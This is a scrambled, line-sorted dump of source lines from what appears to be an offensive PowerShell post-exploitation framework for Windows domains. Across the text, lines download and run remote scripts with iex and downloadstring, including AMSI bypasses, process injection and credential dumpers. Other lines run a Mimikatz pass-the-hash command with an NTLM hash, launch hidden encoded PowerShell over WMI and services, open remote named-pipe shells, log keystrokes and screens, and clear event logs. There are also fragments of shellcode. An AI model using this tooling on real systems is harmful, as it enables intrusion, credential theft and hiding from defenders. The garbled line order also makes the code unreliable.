    
     
      
       
        
           
            
              
                        var content = File.ReadAllBytes(path)
                        writer.Flush()
                    $TrustAttributes 
                    else
                    if (File.Exists(path))
                    var url = tokens[1]
                    {
                    }
                $finalResult = 
                'ComputerName' = $Computer
                'PipeClient'   = $pipeClient
                'PipeName'     = $PipeName
                'StreamReader' = $sr
                'StreamWriter' = $sw
                0 { 'Disabled' }
                1 { 'Inbound' }
                1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                2 { 'Outbound' }
                2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                3 { 'Bidirectional' }
                3 { 'MIT' }
                Console.WriteLine(request)
                SourceName      = $Domain
                TrustDirection  = $Direction
                TrustType       = $TrustType
                Write-Output $finalResult
                break
                var request = reader.ReadLine()
                var tokens = request.Split(' ')
                writer.Flush()
                {
                }
            $TrustAttributes = @()
            $global:Message 
            $global:MultipleSessions.Add($result)
            $pipeClient.Connect(100)
            $sr = New-Object System.IO.StreamReader($pipeClient)
            $sw = New-Object System.IO.StreamWriter($pipeClient)
            $trustInfo
            $trustInfo = New-Object PSObject -Property @{
            Computer  = $Computer
            Handle    = $psRunspace.BeginInvoke()
            PowerShell ps = PowerShell.Create()
            Runspace  = $psRunspace
            foreach ($key in $TrustAttributesMapping.Keys) {
            if (!$pipeClient.IsConnected) { return $null }
            if ($inputFromUser -eq 'exit') {
            if ($inputFromUser) {
            ps.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String(script)))
            ps.Invoke()
            return [PSCustomObject]@{
            using (var client = Listener.AcceptTcpClient())
            using (var reader = new StreamReader(stream))
            using (var stream = client.GetStream())
            using (var writer = new StreamWriter(stream))
            {
            }
        $ComputerAccess 
        $allcomputers 
        $base64Input = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($CmdInput))
        $chunks = Reverse($chunks)
        $command = $command 
        $finalCommandBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalCommand))
        $hostname = ($bookmark.DisplayName -split '
        $objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
        $objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
        $output 
        $psRunspace = [powershell]::Create().AddScript({
        $psRunspace.RunspacePool = $runspacePool
        $result 
        $result = $runspace.Runspace.EndInvoke($runspace.Handle)
        $results = $searcher.FindAll()
        $runspace.Runspace.Dispose()
        $runspaces 
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.Dispose()
        $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
        Instance = $powerShellInstance
        Listener.Start()
        Status   = $powerShellInstance.BeginInvoke()
        [Parameter(Mandatory = $false)]
        [Parameter(Mandatory = $true)]
        [string]$ADCompDomain
        [string]$Server
        [string]$command
        [switch]$Admin
        [uint32]'0x00000001' = 'NON_TRANSITIVE'
        [uint32]'0x00000002' = 'UPLEVEL_ONLY'
        [uint32]'0x00000004' = 'FILTER_SIDS'
        [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
        [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
        [uint32]'0x00000020' = 'WITHIN_FOREST'
        [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
        [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
        [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
        [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
        [uint32]'0x00000400' = 'PIM_TRUST'
        do {
        foreach ($result in $results) {
        if ($result) {
        if ($results) { $results.Dispose() }
        if ($startProcess.ReturnValue -ne 0) {
        param ([string]$CmdInput)
        return $Computer
        return $null
        static void Main(string[] args)
        while (true)
        {
        }
        } 
        } while ($true)
        }).AddArgument($Computer).AddArgument($PipeName)
     :::     ::::     :::: ::::    ::: :::::::::: :::::::: :::::::::::     :::      ::::::::  
    $Computers = $Computers 
    $Error.clear()
    $TrustAttributesMapping = @{
    $allcomputers = @()
    $arr = $chunks 
    $assemblyPath = ([System.AppDomain]::CurrentDomain.GetAssemblies() 
    $bookmark = $global:bookmarks 
    $chunks = @(for ($i = 0
    $index = 5
    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
    $objSearcher.PageSize = 1000  
    $ourerror = $error[0]
    $output 
    $output = @()
    $params = New-Object System.CodeDom.Compiler.CompilerParameters
    $params.GenerateExecutable = $true
    $params.OutputAssembly = $outputFile
    $params.ReferencedAssemblies.Add($assemblyPath) > $null
    $powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
    $powerShellInstance.RunspacePool = $runspacePool
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $result = $result 
    $result = $runspace.Instance.EndInvoke($runspace.Status)
    $result = [System.Text.Encoding]::UTF8.GetBytes($command)
    $results = $objSearcher.FindAll()
    $runspacePool.Close()
    $runspacePool.Dispose()
    $runspacePool.Open()
    $runspaces = @()
    $runspaces.Add([PSCustomObject]@{
    $script = [System.Convert]::ToBase64String(([System.Text.Encoding]::UTF8.GetBytes($content)))
    $size = 8
    )
    Param (
    [array]::Reverse($arr)
    catch {
    class Program
    finally {
    foreach ($Computer in $FinalTargets) {
    foreach ($chunk in $chunks) {
    foreach ($result in $results) {
    foreach ($runspace in $runspaces) {
    if ($ADCompDomain) {
    if ($bookmark) {
    if ($chunks.Count -gt 1) {
    if ($command.Length -lt 8) {
    if ($result) {
    if (($ourerror) -eq $null) {
    ls 
    param (
    param ($Computer)
    public TcpListener Listener { get
    public void Start(string rootDirectory)
    return $allcomputers 
    return $arr
    return $output
    return $result
    try {
    while ($command.Length -lt 7) {
    {
    }
    } else {
    })
   :
  ')
 $RunCmd -CmdInput $Command
 $RunCmd -CmdInput $inputFromUser
 $fileExtension)
 $finalCommandBase64)}
 $global:MultipleSessions.Count
 $global:MultipleSessions.Count 
 $global:directAdminSessions.Count
 $global:directAdminSessions.Count 
 $global:directAdminSessions.Count) 
 $global:listenerSessions.Count
 $global:listenerSessions.Count 
 $global:listenerSessions.Count) 
 $i 
 $i -ge 0
 $i -lt $command.Length
 $i -lt $global:MultipleSessions.Count
 $i -lt $global:bookmarks.Count
 $i -lt $global:listenerSessions.Count
 $i -lt $host.UI.RawUI.WindowSize.Height
 $i--) {
 $j -ge 0
 $j--) {
 $randomvalue
 $userDir
 % {
 % {[char]$_})
 % {[char]$_}) -join ''
 % {[char]$_}) -join ''}
 (97..122) 
 (Get-Random)
 1000)) {
 5) -and $choice -lt ($global:directAdminSessions.Count 
 5)) {
 Add one empty line at the end
 Adding the session to the global list
 Adjust for base numbering and other sessions' count
 Admin sessions don't have a unique identifier
 All Domains
 Assign values based on their presence
 Calculate the desiredIndex for the removed session
 Check every 5 seconds
 Check if the identifier exists in the listener sessions
 Check if the identifier exists in the multi listener sessions
 Check if the primary script is still running using its Process ID
 Check if this target is not already in sessions
 Check network for admin access
 Cleanup the runspace pool when all tasks are complete
 Clear error listing
 Close and dispose of the runspace pool
 Close and dispose of the runspace pool for good resource management
 Close resources related to this pipe and return to the previous menu.
 Close the pipe
 Collect results and handle any output or errors
 Collect the results
 CommandStatus='Completed'} 
 Compute end indices for the various session categories
 Construct distinguished name for the domain.
 Construct the LDAP path and create the DirectorySearcher
 Convert the Base64 string back to bytes and write to a local file
 Create a CimSession with the provided credentials
 Create a separate variable that will be captured by the script block
 Create and open a runspace pool
 Create and output the custom object
 Create security descriptor to allow everyone full control over the pipe
 Create the folder if it does not exist
 Create the runspaces list
 Define the TrustAttributes mapping
 Define the script block
 Define the script block outside the loop for better efficiency
 Display Available Options
 Display Bookmarks
 Display Direct Admin Access Sessions
 Display Multiple Listener Sessions
 Display Single Listener Sessions
 Display the Session Menu
 Dispose of the individual runspace when done
 Embedded monitoring script
 Ensure StreamReader is not closed and then close it
 Ensure StreamWriter is not closed and then close it
 Enumerate the results
 Execute each predefined command
 Execute the embedded monitoring script in a hidden window
 Execute the search
 Exit the loop properly by reading the key press
 Exit the monitoring script
 Extract the desired index from the user input
 Extract the hostname from the original display name
 Extract the unique identifier
 Failed to execute
 Fetch the actual remote prompt
 Find the bookmark with the matching display index
 Folder Structure Creation
 ForEach-Object {
 ForEach-Object { $_ -replace '
 ForEach-Object { $_ }
 ForEach-Object { $_.Handle.AsyncWaitHandle.WaitOne() } > $null
 ForEach-Object { $_.Trim() }
 ForEach-Object { $_.Trim() }}
 ForEach-Object { -bnot ($_ -band 0xFF) -band 0xFF }
 ForEach-Object { Write-Output $_ }}
 ForEach-Object {$_.Pipe.Dispose()}
 ForEach-Object {$subfolderPath = Join-Path -Path $basePath -ChildPath $_
 Format-Table -AutoSize 
 Format-Table -HideTableHeaders 
 Get User Input
 Get the current process ID
 Get the hostname and $pwd from the client
 Get-Random -Count 16 
 Get-WmiObject -Class $ClassID -Filter 
 Global Variables Setup
 Handle or log errors
 Handling paging internally
 If choice is numeric and in the range of directAdminSessions indices
 Increment elapsed time
 Initialize a mutex to synchronize access to sc.exe operations
 Initialize the runspace pool
 Initialize the variables to empty strings
 LDAP search request setup.
 Listener.LocalEndpoint)
 Load necessary .NET assemblies
 Name of the service you want to delete
 No Admin Access
 Notify the user
 Now create an instance of this server in PowerShell and start it
 Out-File $PWD
 Out-Null
 Out-String
 Out-String 
 Out-String -Width 4096
 Out-String -Width 4096}
 Out-String -Width 4096}catch{}
 Perform the search
 Process the results
 Read response from the client
 Read the command from the server's console
 Read the content of the file in Base64 format
 Read the local file's content and convert it to Base64
 Read the response from the StreamReader
 Release the mutex
 Remove Outbound Trust from $AllDomains
 Remove Unreachable domains
 Remove all bookmarks associated with single listener and multi listener sessions
 Remove the bookmark if it exists
 Remove the session from the global list
 Remove the session from the single list
 Remove-CimSession
 Resolve the trust attributes
 Resolve the trust direction
 Resolve the trust type
 Save TGTs
 Save clipboard to file
 Saving to c:
 Select Domain 
 Select-Object -ExpandProperty Children 
 Select-Object -ExpandProperty Forest 
 Select-Object -ExpandProperty Name)
 Select-Object -ExpandProperty Path')
 Select-Object -ExpandProperty TargetName})
 Select-Object -First 1 } 
 Select-Object -First 1).Location
 Select-Object -First 1}
 Select-Object -Property $KeyID -ExpandProperty $KeyID)
 Send 'kill' command to the session
 Set your files' directory here
 Set-WmiInstance -Arguments 
 Sleep for a short interval before the next iteration
 Sort ID 
 Sort ProcessName 
 Sort-Object
 Sort-Object -Unique
 Sort-Object -Unique 
 Specify the folder where files will be downloaded
 Starting index
 Store handle and other info for later retrieval
 Trust Domains (save to variable)
 Update bookmark
 Update the $Computers variable with the list of reachable hosts
 Use a generic list for better performance when adding items
 Use the CimSession to delete the class
 Use the function to kill this session
 Use your function to kill this session
 Wait for all jobs to complete
 Wait-Job
 Where-Object { 
 Where-Object { $_ -and $_.trim() }
 Where-Object { $_ -ne $AllDomain }}
 Where-Object { $_ -ne '' -and $_ -ne $null }
 Where-Object { $_ -notin $AllDomains }
 Where-Object { $_ -notin $OutboundTrusts }
 Where-Object { $_ }
 Where-Object { $_.Id -eq $PID } 
 Where-Object { $_.Identifier -eq $identifier }
 Where-Object { $_.PipeName -eq $bookmarkIdentifier }
 Where-Object { $_.TrustDirection -eq 'Outbound' } 
 Where-Object { $_.UniquePipeID -eq $bookmarkIdentifier }
 Where-Object {$_ -ne $HostFQDN}
 Where-Object{
 WinExec x64 PI Null Free 
 Write the command to the StreamWriter
 Writes Out Hex for Shellcode Bytes
 [System.Net.Dns]::GetHostEntry($_).HostName } catch { } }'
 break}
 call 0x1c
 call rax
 cld
 content.Length)
 dec ecx
 ft -Autosize 
 ft -Autosize -HideTableHeaders 
 https://blog.gentilkiwi.com'
 https://github.com/3xpl01tc0d3r/ProcessInjection'
 https://github.com/GhostPack/Rubeus'
 https://github.com/Leo4j/Invoke-GrabTheHash'
 https://github.com/Leo4j/Invoke-SMBRemoting 
 https://github.com/MzHmO/PowershellKerberos'
 https://github.com/tmenochet/PowerDump'
 if(
 inc rcx
 inc rdx
 je 0x5e
 jmp 0x52
 jmp 0x7f
 jne 0x3d
 jrcxz 0x7e
 out-string 
 private set
 ret
 syscall
"                        stream.Write(content, 0, content.Length)"
"                        writer.WriteLine("""")"
"                        writer.WriteLine(""Connection: close"")"
"                        writer.WriteLine(""Content-Length: "" "
"                        writer.WriteLine(""HTTP/1.1 200 OK"")"
"                        writer.WriteLine(""HTTP/1.1 404 Not Found"")"
"                    if (url == ""/"") url = ""/index.html"""
"                    var path = Path.Combine(rootDirectory, url.Replace(""/"", """
"                TargetName      = $result.Properties[""trustPartner""][0]"
"                TrustAttributes = ($TrustAttributes -join ', ')"
"                WhenChanged     = $result.Properties[""whenChanged""][0]"
"                WhenCreated     = $result.Properties[""whenCreated""][0]"
"                Write-Output """""
"                if ($result.Properties[""trustattributes""][0] -band $key) {"
"                if (tokens[0] == ""GET"")"
"            $Direction = Switch ($result.Properties[""trustdirection""][0]) {"
"            $TrustType = Switch ($result.Properties[""trusttype""][0]) {"
"            $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(""$Computer"", $PipeName, 'InOut')"
"            [Console]::Write(""[$ComputerName]: PS:"
"            param($Computer, $PipeName)"
"            string script = @""$script"""
"        $bookmark.DisplayName = "" [$newIndex] $hostname"""
"        $commandStr = ""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $base64Input"""
"        $domainDN = ""DC="" "
"        $finalCommand = """
"        $ldapPath = ""LDAP://$domainDN"""
"        $ldapPath = if ($Server) { ""LDAP://$Server/DC=$($Domain -replace '"
"        $searcher.Filter = ""(objectClass=trustedDomain)"""
"        $searcher.PropertiesToLoad.AddRange(@(""name"", ""trustPartner"", ""trustDirection"", ""trustType"", ""trustAttributes"", ""whenCreated"", ""whenChanged""))"
"        Console.WriteLine(""Listening on "" "
"        Listener = new TcpListener(address, port)"
"        Write-Error ""An error occurred: $_"""
"        [System.IO.Pipes.NamedPipeClientStream]$PipeClient,"
"        [System.IO.Pipes.NamedPipeServerStream]$PipeServer,"
"        [System.IO.StreamReader]$StreamReader,"
"        [System.IO.StreamWriter]$StreamWriter,"
"        [string]$Command,"
"        [string]$Domain,"
"        [string]$PipeName,"
"        [string]$SinglePipeName,"
"        [string]$TargetServer,"
"        [string]$Targets,"
"        [string]$computerNameOnly,"
"        [string]$content,"
"        [string]$serviceToDelete,"
"        [switch]$ExecuteExitCommand,"
"        if($cred){$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -Credential $cred -ArgumentList (""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" "
"    $objSearcher.Filter = ""("
"    $params.CompilerOptions = ""/platform:x64 /target:exe"""
"    $params.ReferencedAssemblies.Add(""System.Core.dll"") > $null"
"    $params.ReferencedAssemblies.Add(""System.dll"") > $null"
"    $results = $provider.CompileAssemblyFromSource($params, $translate)"
"    $runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)"
"    $translate = @"""
"    Write-Output "" Available Options:"""
"    Write-Output "" [0] Scan network for Admin Access"""
"    Write-Output "" [1] Single-Listener (single target)"""
"    Write-Output """""
"    public SimpleFileServer(IPAddress address, int port)"
"   ($_.IPAddress.StartsWith(""10."") -or "
" "" """
" ""($counter)"" "
" ""Clipboard"""
" ""Keylog"""
" ""RDPKeylog"""
" ""_"" "
" ""history"""
" ""log.txt"""
" ""screenshot"""
" ($ADCompDomain -replace """
" Check if client is still connected. If not, break."
" ForEach-Object { ($_ -split """
" ForEach-Object { try { ""$_ - "" "
" ForEach-Object {wevtutil cl ""$_""}"
" If the file exists, keep incrementing the counter and updating the filename"
" If the process is not running, delete the service"
" If the process is not running, kill the File Server"
" Make or Steal a Token"""
" Optionally, remove the session when done"
" Out-File ""c:"
" Out-Null"""
" Out-String -Width 4096"""
" Out-String -Width 4096}else{Write-Output """""
" Out-String"""
" Out-String"""""
" Out-String"")"
" Out-String) -split """
" Remove any extraneous whitespace, newlines etc."
" Remove the associated bookmark, if it exists"
" Remove the last empty line, if it exists"
" Remove-Job"")"
" Revert: [GLSet $OldGlobalPipeName]"""
" Select ID, ProcessName, SessionId, Path "
" Select ID, ProcessName, SessionId, UserName, Path "
" Select-Object DisplayName, Name, ProcessId, StartName'"
" Select-String -Pattern """
" Sort UserName,ProcessName "
" Sort-Object { $_.ComputerName.ToString(),$_.UserID.ToString(),$_.PipeName.ToString() })"
" Sort-Object { $_.ComputerName.ToString(),$_.UserID.ToString(),$_.UniquePipeID.ToString() })"
" Sort-Object { [int]([regex]::Match($_.DisplayName, '("
" Timeout: 25sec"""
" When the client connects, store its details in the $sessions array"
" Where-Object { $_ -match """
" Where-Object { $_ -match ""No Access"" }"
" Where-Object { $_ -match ""The current user has"" }"
" Where-Object { $_ -match ""has Local Admin access on"" }"
" Where-Object { $_ -ne """" }"
" Where-Object { $_ -ne ""0.0.0.0"" -and $_ -ne ""127.0.0.1"" } "
" Where-Object { $_ -notmatch ""The current user has""}"
" Where-Object { $_ -notmatch ""has Local Admin access on"" -AND $_ -notmatch ""Command execution completed""}"
" Where-Object { $_.DisplayName -like """
" Where-Object { $_.ManifestModule.Name -ieq ""System.Management.Automation.dll"" } "
" Where-Object { $_.Name -like """
" Where-Object {$_ -ne ""$HostFQDN""}"
" Where-Object {$_ -ne ""$TempHostname""}"
" Where-Object {$_.State -eq ""Running""} "
" Write-Output """""
" [PInject]"""
" add al, 0x53 exit_thread syscall val"
" add edx,eax"
" add r10,r9"
" add r11,r9"
" add r14,r9"
" add r15,r9"
" add r15,rcx"
" add rax,r9"
" add rsi,r9"
" cmp edx,r8d"
" exit"""
" foreach-object { ""$($_.ToString(""X2""))"" })"""
" https://github.com/Leo4j/Find-LocalAdminAccess"""
" https://github.com/Leo4j/Invoke-SessionHunter"""
" https://github.com/Leo4j/Invoke-WMIRemoting"""
" https://github.com/Leo4j/PassSpray"""
" https://github.com/Leo4j/Token-Impersonation"""
" https://github.com/Leo4j/Validate-Credentials"""
" https://github.com/PowerShellMafia/PowerSploit'"""
" https://github.com/nocerainfosec/TakeMyRDP2.0"""
" https://github.com/vletoux/MakeMeEnterpriseAdmin"""
" lea rcx,[rsp]"
" lods al,byte ptr ds:[rsi]"
" mov eax,DWORD PTR [r11"
" mov ecx,DWORD PTR [r9"
" mov ecx,dword ptr [r15"
" mov esi,DWORD PTR [r14"
" mov r10d,DWORD PTR [r15"
" mov r11d,DWORD PTR [r15"
" mov r14d,dword ptr [r15"
" mov r15b,0x88"
" mov r15d,dword ptr [r15]"
" mov r8d, 0x78b5b983 TerminateProcess Hash"
" mov r8d,0xe8afe98 WinExec Hash"
" mov r9,QWORD PTR [r9"
" mov r9,QWORD PTR [r9]"
" mov r9,QWORD PTR [rsi]"
" mov rax,qword ptr gs:[rdx"
" mov rbx, rax"
" mov rsi,qword ptr [rax"
" movzx ecx,WORD PTR [r10"
" ror edx,0xd"
" sub rsp, 0x28"
" test al,al"
" xor r15,r15"
" xor rax,rax"
" xor rcx,rcx"
" xor rdx,rdx"
" xor rsi,rsi"
"""                      Specify your targets - comma separated hostnames"""
"""                     Specify your targets - comma separated hostnames"""
"""        Specify Credentials and gain a shell as that user"""
"""       Specify Credentials and gain a shell as that user"""
""" -Command "
""" -Domain "
""" -NoOutput -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword"")"
""" -NoOutput -Targets $userdeftargets"")"
""" -NoOutput -UserName $userdefusername -Password $userdefpassword"")"
""" -NoOutput"")"
""" -OR $command -like ""AutoMimi"
""" -OR $command -like ""DCSync"" -OR $command -like ""Access_Check"
""" -OR $command -like ""Find-LocalAdminAccess"
""" -OR $command -like ""Invoke-SessionHunter"
""" -OR $command -like ""Migrate2 "
""" -OR $command -like ""Mimi"
""" -OR $line -like """
""" -Password "
""" -Read"""
""" -WindowStyle Hidden"","
""" -f hex'"""
""" exitfunc=thread -b "
""""", """
"""$', ''"
"""$($global:ServerURL)/Ask4Creds.ps1"","
"""$($global:ServerURL)/Ferrari.ps1"","
"""$($global:ServerURL)/Find-LocalAdminAccess.ps1"","
"""$($global:ServerURL)/HiveDump.ps1"","
"""$($global:ServerURL)/Invoke-GrabTheHash.ps1"","
"""$($global:ServerURL)/Invoke-Patamenia.ps1"","
"""$($global:ServerURL)/Invoke-SMBRemoting.ps1"","
"""$($global:ServerURL)/Invoke-SessionHunter.ps1"","
"""$($global:ServerURL)/Invoke-WMIRemoting.ps1"","
"""$($global:ServerURL)/NETAMSI.ps1"","
"""$($global:ServerURL)/PInject.ps1"","
"""$($global:ServerURL)/RDPKeylog.exe"","
"""$($global:ServerURL)/SimpleAMSI.ps1"","
"""$($global:ServerURL)/Suntour.ps1"","
"""$($global:ServerURL)/TGT_Monitor.ps1"""
"""$($global:ServerURL)/Tkn_Access_Check.ps1"","
"""$($global:ServerURL)/Token-Impersonation.ps1"","
"""$($global:ServerURL)/cms.ps1"","
"""$($global:ServerURL)/dumper.ps1"","
"""$($global:ServerURL)/klg.ps1"","
"""$($global:ServerURL)/pwv.ps1"","
"""$Command"
"""$KeyID = '$GuidOutput'"
"""$RawClientScript"
"""$RawServerScript"
"""$SID"
"""$ShCodePlaceholder"
"""$Target"
"""$arguments"
"""$finalstring"
"""$pipeName"
"""$startarguments"
"""'''"""
""") -OR ($command -like ""WMIRemoting "
""") {"
""")) {"
"""))"")"
""").TrimStart('"
""")[3] -split "":"" "
"""){$ExitLoop = $True"
"""){$finalstring = ""powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript""}"
"""){$finalstring = ""powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript""}"
"""){break}else{try{"
"""){}"
""", 'InOut')"
"""-NoP"
"""-enc $b64ServerScript"
"""-enc $b64ServerScriptEdit"
"""-ep Bypass"
"""@ -Language CSharp"
"""AV"", ""Kerb"", ""Patch"", ""PatchNet"", ""PInject"", ""Services"", ""ShellGen"","
"""Administrator"
"""Allow"
"""DC01.ferrari.local,Server2012.ferrari.local"
"""FullControl"
"""HashGrab"", ""Rubeus"", ""PowerView"", ""Hive"", ""Dpapi"","
"""Mimi"", ""AutoMimi"", ""ClearLogs"", ""ClearHistory"", ""Net"", ""Sessions"", ""Software"", ""CredMan"", "
"""P@ssw0rd!"
"""S-1-1-0"
"""Start-Process sc.exe -ArgumentList "
"""Start-Sleep -Milliseconds 1000"","
"""Start-Sleep -Milliseconds 2000"""
"""Startup"", ""TLS"", ""Process"""
"""Workstation-01.ferrari.local,DC01.ferrari.local"
"""Write-Output ''"
"""comma_separated_Targets"
"""dummyhostdropconnection,"
"""exit"
"""ferrari"
"""ferrari.local"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-Patamenia.ps1')"""
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Suntour.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/cms.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/pwv.ps1')"
"""powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA="
"""sekurlsa::pth /user:Administrator /domain:ferrari.local /ntlm:217E50203A5ABA59CEFA863C724BF61B"
"""whoami /all"
"$($PipeName).exe"""
"$($global:MultiPipeName).exe"""
"$(Get-Location)"")"
"$(Get-Location),"
"$(whoami)"""")"
"$ClassID = ""Custom_WMI_"" "
"$ClientScript = @"""
"$ClientScript="""
"$ClipboardContent = """""
"$Computer,"
"$ComputerName delete $ServiceName"""
"$ComputerName start $ServiceName"""
"$Computers = $Computers -split "","""
"$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $AllDomain)"
"$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $ParentDomain)"
"$ErrorActionPreference = ""SilentlyContinue"""
"$FileServerMonitoringScript = @"""
"$FinalCommand = """
"$FinalCommand = ""Invoke-WebRequest -Uri '$($global:ServerURL)/RDPKeylog.exe' -OutFile 'C:"
"$Find"")"
"$InjectCommand = ""PInject /t:1 /f:hex /pid:$InjectPID /sc:$InjectHex /enc:AES"""
"$InjectOutput = """""
"$KeyID = ""CmdGUID"""
"$KeylogContent = """""
"$LineComputerAccess = $LineComputerAccess -Join "","""
"$LocalAdminAccessTargets = $global:AllUserDefinedTargets -join "","""
"$Method,"
"$Mutex = [System.Threading.Mutex]::new($false, 'SCMutex')"
"$PipeName = $randomvalue -join """""
"$RawClientScript = """
"$RawClientScript = $RawClientScript.Replace("""
"$RawServerScript = $RawServerScript.Replace("""
"$RawServerScript="""
"$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [System.Environment]::ProcessorCount)"
"$ServerScript = @"""
"$ServerScript="""
"$ServiceName = ""Service_"" "
"$SyncString = ""ababcdcdefefghgh"""
"$Target start $ServiceName"""
"$TargetServer = ""$ComputerName"""
"$TargetServer = ""$Target"""
"$TargetServer delete $serviceToDelete"""
"$TempUsernameGrab = """""
"$UserName,"
"$UserPath = """""
"$WarningPreference = ""SilentlyContinue"""
"$_.Exception.Message-split """""
"$_.IPAddress -match """
"$_.IPAddress.StartsWith(""192.168."")) } "
"$a,[IO.Compression.CoMPressionMode]::deCOmPreSs)"
"$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg("
"$accessRule = New-Object System.IO.Pipes.PipeAccessRule($everyone, ""FullControl"", ""Allow"")"
"$allReachTargets = $allReachTargets -Join "","""
"$arguments = """
"$arguments = ""create $ServiceName binpath= "
"$asyncResult = $tcpClient.BeginConnect($computer, $Port, $null, $null)"
"$asyncResult = $tcpClient.BeginConnect($computer, $port, $null, $null)"
"$asyncResult = $tcpClient.BeginConnect($computer, 445, $null, $null)"
"$baseFileNameWithoutExtension = ""TGTDump"""
"$basePath = ""C:"
"$bitmap = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight)"
"$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)"
"$c-eq """"exit""""){break}"
"$cimInstance = Get-CimInstance -Namespace ""ROOT"
"$cmd-eq""""exit""""){break}else{try{"
"$command -eq ""exit"") {break} "
"$command -eq ""exit"") {break}"
"$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob"")"
"$createNewClass = New-Object System.Management.ManagementClass("""
"$createNewClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::new(), $null)"
"$createNewClass.Properties.Add(""CommandStatus"", [System.Management.CimType]::String, $false)"
"$createNewClass.Properties.Add(""OutputData"", [System.Management.CimType]::String, $false)"
"$createNewClass.Properties.Add($KeyID, [System.Management.CimType]::String, $false)"
"$createNewClass.Properties[$KeyID].Qualifiers.Add(""Key"", $true)"
"$createNewClass[""__CLASS""] = $ClassID"
"$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)"
"$cred = New-Object System.Management.Automation.PSCredential($UserName,$SecPassword)"
"$cred = New-Object System.Management.Automation.PSCredential($userdefusername,"
"$desiredIndex = ""[{0}]"" -f $commandParts[1]"
"$desiredIndex = ""[{0}]"" -f ($indexToRemove "
"$directory = ""c:"
"$dummyPipeClient.Close()"""
"$env:COMPUTERNAME,"
"$env:computerName)).HostName),"
"$err-split"""""
"$errorMessage -split """
"$everyone = New-Object System.Security.Principal.SecurityIdentifier ""S-1-1-0"""
"$exefilelocation = ""C:"
"$exescript = ""Start-Process powershell.exe -WindowS Hidden -ArgumentList "
"$fileContentBase64 = """""
"$fileExtension = "".png"""
"$fileExtension = "".txt"""
"$fileName = Join-Path -Path $directory -ChildPath (""$baseFileNameWithoutExtension($counter)$fileExtension"")"
"$finalstring =  ""Start-Process powershell.exe -WindowS Hidden -ArgumentList "
"$finalstring =  ""powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"""
"$finalstring = $finalstring -replace '""', ""'"""
"$fullCommand = ""$Command 2>"
"$fullCommand = ""$userCommand 2>"
"$fulluserpath = ""C:"
"$gatherhostname = """""
"$global:AllUserDefinedTargets = $Targets -split "","" "
"$global:AllUserDefinedTargets = $commandParts[1] -split "","" "
"$global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList ""-ep Bypass"", ""-NoProfile"", ""-enc $encodedCommand"" -PassThru"
"$global:Message = "" No bookmark found $desiredIndex"""
"$global:Message = "" Removed bookmark $desiredIndex"""
"$global:Message = "" ["
"$global:Message = "" [-] Failed to execute"""
"$global:Message = "" [-] Invalid selection. Please try again."""
"$global:Message = "" [-] Invalid session number. Please try again."""
"$global:Message = "" [-] Killing Admin sessions is not needed, they are not active"""
"$global:Message = "" [-] No connection was established"""
"$global:Message = $global:Message -split """
"$global:ServerURL = ""http://$($DefineHostname):$userdefPort"""
"$global:ServerURL = ""https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"""
"$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)"
"$gzipCompressor = [System.IO.Compression.GzipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Compress)"
"$gzipCompressor.Write($bytesToCompress, 0, $bytesToCompress.Length)"
"$index = [array]::IndexOf($commandParts, ""-Domain"", [System.StringComparison]::CurrentCultureIgnoreCase)"
"$index = [array]::IndexOf($commandParts, ""-DomainController"", [System.StringComparison]::CurrentCultureIgnoreCase)"
